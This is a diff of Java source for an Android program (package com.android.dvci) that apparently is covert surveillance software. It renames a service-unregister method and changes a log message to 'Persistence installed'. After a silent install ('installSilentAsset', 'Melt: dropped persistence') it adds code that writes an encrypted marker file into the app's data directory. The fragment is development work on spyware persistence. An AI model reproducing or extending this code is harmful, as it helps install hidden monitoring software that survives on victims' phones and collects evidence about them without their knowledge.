@@ -27,6 +27,8 @@ import com.android.dvci.action.UninstallAction;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfType;
 import com.android.dvci.conf.Configuration;
+import com.android.dvci.crypto.CryptoException;
+import com.android.dvci.crypto.EncryptionPKCS5;
 import com.android.dvci.crypto.Keys;
 import com.android.dvci.evidence.EvDispatcher;
 import com.android.dvci.evidence.EvidenceBuilder;
@@ -116,9 +118,9 @@ public class Core extends Activity implements Runnable {
 		return singleton;
 	}
 
-	public synchronized static void serivceUnregister() {
+	public synchronized static void serviceUnregister() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (serivceUnregister) ...");
+			Check.log(TAG + " (serviceUnregister) ...");
 		}
 		if (singleton != null && singleton.serviceMain != null) {
 			singleton.serviceMain.stopListening();
@@ -1146,13 +1148,24 @@ public class Core extends Activity implements Runnable {
 			file.delete();
 
 			if (PackageUtils.isInstalledApk(dvci)) {
-				EvidenceBuilder.info("Dropped persistence");
+				EvidenceBuilder.info("Persistence installed");
 				if (Cfg.DEMO) {
 					Status.self().makeToast(M.e("Melt: dropped persistence"));
 				}
 
 				//Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
 				//markupMelt.serialize(Status.getAppContext().getPackageName());
+
+				AutoFile markup = new AutoFile(String.format("/data/data/%s/files/mm", dvci));
+				final byte[] confKey = Keys.self().getConfKey();
+				EncryptionPKCS5 crypto = new EncryptionPKCS5(confKey);
+				try {
+					markup.write(crypto.encryptData(pack.getBytes()));
+				} catch (CryptoException ex) {
+					if (Cfg.DEBUG) {
+						Check.log(ex);
+					}
+				}
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installSilentAsset), stopping melt");
@@ -1173,6 +1186,8 @@ public class Core extends Activity implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (stopService), sending intent");
 		}
+
+
 		Intent intent = new Intent(Status.getAppContext(), ServiceMain.class);
 		Status.getAppContext().stopService(intent);
 	}
